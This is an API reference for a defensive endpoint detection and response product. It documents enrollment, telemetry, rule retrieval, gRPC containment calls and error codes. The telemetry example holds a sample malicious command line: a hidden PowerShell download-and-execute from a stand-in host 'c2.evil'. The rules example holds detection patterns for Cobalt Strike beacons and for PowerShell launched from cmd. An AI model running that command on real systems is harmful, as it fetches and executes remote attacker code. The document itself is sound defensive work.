# 🔌 AEGIS EDR - API Reference Guide

This document defines the interface specifications, protocol contracts, and authorization architectures for the AEGIS EDR API interfaces (REST, gRPC, and WebSockets).

---

## 📖 Table of Contents
1. [API Architecture & Security Protocol](#1-api-architecture--security-protocol)
2. [REST API Reference](#2-rest-api-reference)
3. [gRPC API Reference](#3-grpc-api-reference)
4. [WebSocket Stream Reference](#4-websocket-stream-reference)
5. [Error Handling & API Status Codes](#5-error-handling--api-status-codes)

---

## 1. API Architecture & Security Protocol

AEGIS endpoints expose three communication protocols depending on deployment targets:
- **gRPC**: Handles high-performance local Inter-Process Communication (IPC) between CLI-Daemon and agent-to-fleet control messaging.
- **REST**: Serves configuration updates, static file downloads, and agent enrollments over standard HTTP.
- **WebSockets**: Streams real-time telemetry alerts from endpoints to the console.

### 1.1 Authentication & Role-Based Access Control (RBAC)
- **mTLS (gRPC)**: Connections require mutual TLS (mTLS) with client certificates issued by the fleet Root CA.
- **JWT (REST & WebSockets)**: HTTP headers must supply a JSON Web Token (JWT) inside the authorization header:
  ```http
  Authorization: Bearer <jwt_token>
  ```
- **RBAC Roles**:
  - `Admin`: Full read/write, rules modifications, containment trigger authority.
  - `Analyst`: Forensic read, rules modification, TUI viewing. Containment requires explicit manual approval.
  - `Reader`: Read-only telemetry checking.

---

## 2. REST API Reference

The REST service operates on HTTPS port `8443` of the Central Fleet Server.

### 2.1 Agent Enrollment
Enrolls a new EDR agent node.

- **HTTP Method**: `POST`
- **Path**: `/api/v1/agent/enroll`
- **Headers**:
  ```http
  Content-Type: application/json
  X-Enrollment-Token: <pre_shared_secret>
  ```

#### Request Payload
```json
{
  "hostname": "workstation-01",
  "os_platform": "linux",
  "os_version": "Ubuntu 22.04",
  "architecture": "amd64",
  "mac_address": "00:0a:95:9d:68:16"
}
```

#### Response Payload (`201 Created`)
```json
{
  "status": "enrolled",
  "agent_id": "agent-1234-abcd",
  "client_certificate": "-----BEGIN CERTIFICATE-----\nMIIB...-----END CERTIFICATE-----",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIE...-----END PRIVATE KEY-----"
}
```

---

### 2.2 Alert Telemetry Submission
Forwards alerts to the fleet database when risk thresholds are triggered.

- **HTTP Method**: `POST`
- **Path**: `/api/v1/agent/telemetry`
- **Headers**:
  ```http
  Authorization: Bearer <jwt_token>
  Content-Type: application/json
  ```

#### Request Payload
```json
{
  "agent_id": "agent-1234-abcd",
  "alert": {
    "rule_name": "Powershell_Remote_Download",
    "risk_score": 8.7,
    "mitre_id": "T1059.001",
    "event_data": {
      "pid": 4056,
      "ppid": 1022,
      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "cmdline": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://c2.evil/pay.ps1')"
    }
  }
}
```

#### Response Payload (`200 OK`)
```json
{
  "status": "received",
  "alert_id": "alert-9876-xyz"
}
```

---

### 2.3 Engine Rules Retrieval
Fetches the latest rule configurations.

- **HTTP Method**: `GET`
- **Path**: `/api/v1/agent/rules`
- **Headers**:
  ```http
  Authorization: Bearer <jwt_token>
  ```

#### Response Payload (`200 OK`)
```json
{
  "revision": 45,
  "rules": {
    "yara": [
      {
        "name": "CobaltStrike_Beacon_Memory",
        "content": "rule CobaltStrike { strings: $a = \"beacon.dll\" condition: $a }"
      }
    ],
    "sigma": [
      {
        "name": "Process_Creation_Cmd_Spawning_Powershell",
        "content": "detection: selection: ParentImage|endswith: 'cmd.exe' Image|endswith: 'powershell.exe'"
      }
    ]
  }
}
```

---

## 3. gRPC API Reference

The local IPC channel implements the following Protobuf definition:

```protobuf
syntax = "proto3";
package aegis.api.v1;

service AegisService {
  // Query status of the local agent daemon
  rpc GetStatus(StatusRequest) returns (StatusResponse);

  // Run immediate filesystem scanning tasks
  rpc RunScan(ScanRequest) returns (stream ScanResult);

  // Trigger active response containment playbooks
  rpc TriggerResponse(ResponseRequest) returns (ResponseResponse);

  // Retrieve chronological timeline metadata
  rpc GetTimeline(TimelineRequest) returns (stream TimelineEvent);
}

message StatusRequest {}
message StatusResponse {
  string version = 1;
  string status = 2; // "RUNNING", "STOPPING", "ERROR"
  double cpu_usage = 3;
  double ram_usage = 4;
  int32 yara_rules_loaded = 5;
  int32 sigma_rules_loaded = 6;
}

message ScanRequest {
  string path = 1;
  bool recursive = 2;
}
message ScanResult {
  string file_path = 1;
  bool matched = 2;
  string match_rule = 3;
}

message ResponseRequest {
  string action = 1; // "KILL", "SUSPEND", "ISOLATE", "QUARANTINE"
  int32 target_pid = 2;
  string target_file = 3;
  string security_token = 4;
}
message ResponseResponse {
  bool success = 1;
  string message = 2;
  string action_executed = 3;
}

message TimelineRequest {
  int64 start_time_epoch = 1;
  int64 end_time_epoch = 2;
}
message TimelineEvent {
  string timestamp = 1;
  string category = 2; // "PROCESS", "FILE", "NETWORK", "ALERT"
  string description = 3;
  double risk_score = 4;
}
```

---

## 4. WebSocket Stream Reference

Streams real-time alerts from enrolled agents.

- **WebSocket URL**: `wss://<fleet_server>:8443/api/v1/stream/telemetry`
- **Headers**:
  ```http
  Authorization: Bearer <jwt_token>
  ```

### Message Struct (JSON Payload)
```json
{
  "event": "alert",
  "agent_id": "agent-1234-abcd",
  "data": {
    "timestamp": "2026-07-11T09:09:09Z",
    "alert_id": "alert-8877-uvw",
    "risk_score": 9.5,
    "rule_name": "Injected_Executable_Memory_Detected",
    "mitre_id": "T1055.001",
    "summary": "Process dynamic injection found in memory of explorer.exe (PID: 2310)"
  }
}
```

---

## 5. Error Handling & API Status Codes

AEGIS APIs use standard error formatting blocks:

```json
{
  "error": {
    "code": "INVALID_PARAMETERS",
    "message": "The request path '/tmp/bin' contains invalid filesystem characters.",
    "status_code": 400
  }
}
```

### Standard Status Codes

| Code | Status Code | Context | Description |
|---|---|---|---|
| `INVALID_PARAMETERS` | **400 Bad Request** | REST/gRPC | Key parameters are missing or failed type-checks. |
| `INVALID_TOKEN` | **401 Unauthorized** | REST/WebSockets | Missing, expired, or malformed JWT in headers. |
| `ACCESS_DENIED` | **403 Forbidden** | REST/gRPC | Authenticated identity lacks permission scopes. |
| `AGENT_NOT_FOUND` | **404 Not Found** | REST | Enrolling database missing target agent ID. |
| `CONGESTION_BACKOFF` | **429 Too Many Requests** | WebSockets | Event queue congestion. Apply backoff delays. |
| `DAEMON_FAILURE` | **500 Internal Error** | gRPC | Ingress system call failed or DB write locked. |
